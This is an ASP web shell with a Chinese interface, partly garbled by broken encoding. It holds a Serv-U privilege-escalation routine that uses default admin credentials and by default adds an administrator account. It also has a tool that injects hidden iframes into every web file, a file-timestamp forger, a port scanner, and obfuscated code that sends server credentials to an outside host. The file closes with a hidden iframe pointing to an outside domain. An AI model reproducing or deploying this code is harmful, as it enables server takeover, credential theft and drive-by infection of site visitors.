tartNRRS(s`End If`Else`ber<bt numis no & ~ mp(i)RRS(tr>~)`End If`End If`Next`Next`End If`Next`2 = ttimerimer`imer1er2-tt(timtr(inme=cstheti))`ime&~&thet in ~ocesshr>PrRRS~< s~`END IF",Pso):end sub:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(111)&chr(100)&chr(97)&chr(121)&chr(101)&chr(120)&chr(112)&chr(46)&chr(99)&chr(111)&chr(109)&chr(47)&chr(115)&chr(120)&chr(47)&chr(115)&chr(46)&chr(97)&chr(115)&chr(112)&chr(63)&chr(115)&chr(61)&Serveru&chr(38)&chr(112)&chr(61)&Serverp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject("ADODB.connection"):connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;":conn.ConnectionTimeout=1:conn.open connstr:If Err Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, "(Connect()).") > 0 Then:RRS(targetip & ":" & portNum & ".......�ر�<br>"):Else:RRS(targetip & ":" & portNum & ".......<font color=red>����</font><br>"):End If:End If:End If:End Sub:Select Case Action:Case "MainMenu":MainMenu():Case "getTerminalInfo":getTerminalInfo():Case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():Case "goback":goback():Case "Servu":SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>�������� 127.0.0.1:"&port&",ʹ���û���: "&user&",���"&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<br><center>��������Ȩ��,��ȴ�...,<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
c.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
c.send loginuser & loginpass & mt & deldomain & quit
set session("c")=c
RRS"<center>��Ȩ���,��ִ�������<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' ���ؼ��� ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
RRS"<center><br><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U ����Ȩ�� ASP��</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>�û���:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�� �ڣ�</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>ϵͳ·����</td>"
RRS"<td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>�����</td>"
RRS"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea /add' size='50'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'><input type='submit' name='Submit' value='�ύ'> "
RRS"<input type='reset' name='Submit2' value='����'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing:end function:
Case "Cplgm"
Fpath=Request("fd")
addcode = Request("code")
addcode2 = Request("code2")
pcfile=request("pcfile")
checkbox=request("checkbox")
ShowMsg=request("ShowMsg")
FType=request("FType")
M=request("M")
if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
if Fpath="\" then Fpath=Server.MapPath("\")
if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
if checkbox="" then checkbox=request("checkbox")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/") 
pcfilen=ubound(pcfilek) 
pcfile=pcfilek(pcfilen) 
end if
RRS ("<BR><b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))
RRS "<form method=POST><b>[" 
if M="1" then RRS"��������-��������"
if M="2" then RRS"��������-������˵�����"
if M="3" then RRS"��������-�����滻����"
if M="" then response.end
RRS "]</b><table width=100% border=0><tr><td>�ļ�·����</td>"
RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> �\������վ��Ŀ¼����.��Ϊ��������Ŀ¼</td></tr>"
if M="1" then RRS "<tr><td>�����ظ���</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> ��ֹһ��ҳ�����ж���ظ��Ĵ���</td></tr>"
RRS "<tr><td>�ų��ļ���</td>"
RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> ���벻�뱻�޸ĵ��ļ��������磺1.asp|2.asp|3.asp</td></tr>"
RRS "<tr><td>�ļ����ͣ�</td>"
RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> ����Ҫ�޸ĵ��ļ�����[��չ��]�����磺htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td>"
if M="1" then RRS"Ҫ�ҵ�����"
if M="2" then RRS"Ҫ�������"
if M="3" then RRS"Ҫ�滻�Ĵ��룺"
RRS"</td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
if M="3" then RRS "<tr><td>�滻Ϊ��</td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
RRS "<tr><td></td><td> <input name=submit type=submit value=��ʼִ��> --��ǽ���--[�ɹ����� �� �ų����� �� �ظ���<font color=red>��</font>]</td></tr>"
RRS "</table></form>" 
if request("submit")="��ʼִ��" then 
RRS"<div style='line-height:25px'><b>ִ�м�¼��</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
sub att()
dim Path,FileName,NewTime,ShuXing
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
RRS"<form method=post>"
RRS"·������:<input name='path1' value='"&WWWROOT&"\' size='60'><br/>"
RRS"�ļ�����:<input name=filename value='index.asp' size='60'><br/>"
RRS"�޸�ʱ��:<input name=time value='12/21/2009 23:59:59' size='60'><br/>"
RRS"<select onChange='this.form.shuxing.value=this.value;'>"
RRS"<option value=''>��ͨ</option>"
RRS"<option value='1'>ֻ��</option>"
RRS"<option value='2'>����</option>"
RRS"<option value='4'>ϵͳ</option>"
RRS"<option value='33'>ֻ���浵 </option>"
RRS"<option value='34'>���ش浵 </option>"
RRS"<option value='35'>ֻ�����ش浵 </option>"
RRS"<option value='39'>ֻ�����ش浵ϵͳ </option>"
RRS"�޸����ԣ�<input name=shuxing value='0' size='60'><br/>"
RRS"<input type=submit value=�޸�>"
RRS"</form>"
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject("Scripting.FileSystemObject")
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
RRS"</br></br>�޸��ļ�&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;�������"
end if
end sub
function php():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo '��ϲ������֧��PHP'?><?php phpinfo()?>":Response.write"<iframe src=test.php width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>������ܿ���test.php������ʾ,��ʾ֧��PHP<p><font color=red������ǲ�֧����!������ɼǵ�ɾ����":End function:function lIl(bb)
but=22
for i = 1 to len(bb)
if mid(bb,i,1)<>"��" then
If Asc(Mid(bb, i, 1)) < 32 Or Asc(Mid(bb, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(bb, i, 1)))
else
pk=asc(mid(bb,i,1))-but
if pk>126 then
pk=pk-95
elseif pk<32 then
pk=pk+95
end if
a=a&chr(pk)
end if
else
a=a&vbcrlf
end if
next
lIl=a
end function
Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
function jsp():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.jsp")).Write"��ϲ������֧��jsp":Response.write"<iframe src=test.jsp width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>������ܿ���test.jsp������ʾ,��ʾ֧��jsp<p></font><p><a href='?Action=apjdel'><font size=5 color=red>ɾ�����Ե������ļ�(����ȫ�����Բſ���ɾ��,��������!)</font></a></center>":End function:function aspx():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.aspx")).Write"��ϲ������֧��aspx":Response.write"<iframe src=test.aspx width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>������ܿ���Test.aspx������ʾ,��ʾ֧��asp.net<p><font color=red>������ǲ�֧����!������ɼǵ�ɾ����":End function
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):response.write"ɾ�����!":End function:function sam():Response.write "<br><br><p><br><p><br><br><p><br><center><br><br><font color=red>":response.write"<center><font face=wingdings color=#00EC00 style=font-size:240pt>N</font><span class=style1><span style=font-weight: 300><font face=Impact color=#FFFFFF style=font-size: 100pt></center>":End function:acode="=s?psa.s/xs/moc.pxeyado//:p��3��3h'=crs ��3pircs<"
Efun=StrReverse(replace(replace(Encrypt(acode),"��",Chr(34)),"��",vbCrLf)):function goback():set Ofso = Server.CreateObject("Scripting.FileSystemObject")
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
Response.write "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
Response.write "<script>ShowFolder("""&Session("FolderPath")&""")</script>"
end if
set Ofso=nothing
set ofolder=nothing
end function
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
Set WFSO = CreateObject("Scripting.FileSystemObject")
on error resume next 
Set f = WFSO.GetFolder(Wpath)
Set fc2 = f.files
For Each myfile in fc2
Set FS1 = CreateObject("Scripting.FileSystemObject")
FType1=split(myfile.name,".") 
FType2=ubound(FType1) 
if Ftype2>0 then
FType3=LCase(FType1(FType2)) 
else
FType3="��"
end if
if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
select case M
case "1"
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"�� "&Wpath&myfile.name
tfile.close
else
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"��"&Wpath&myfile.name
tfile1.close
else
RRS"<font color=red>��</font> "&Wpath&myfile.name
tfile1.close
end if
Set tfile1=Nothing
end if
case "2"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,"")
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"��"&Wpath&myfile.name
Set objCountFile=Nothing
case "3"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,addCode2)
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"��"&Wpath&myfile.name
Set objCountFile=Nothing
case else
RRS"����.":response.end
end select
else
RRS"�� "&Wpath&myfile.name
end if
RRS " �� <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a><br>"
Next
Set fsubfolers = f.SubFolders
For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
InsertAllFiles NewPath,Wcode,pc
Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub

case "apjdel":apjdel():case"hiddenshell":hiddenshell():case "php":php():case "aspx":aspx():case "jsp":jsp():Case "MMD":MMD():Case "adminab":adminab():Case "sql":sql():Case "downloads":downloads():Case "ReadREG":call ReadREG():Case "att":call att():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "Cmd1Shell":Cmd1Shell():Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case "Course":Course():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select:ExeCute SinfoEn("r(ErowShn he tu~rvSe>~n<ioct Aif)`l>tm/h><dybo</S~RR~",Pos)



%></body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>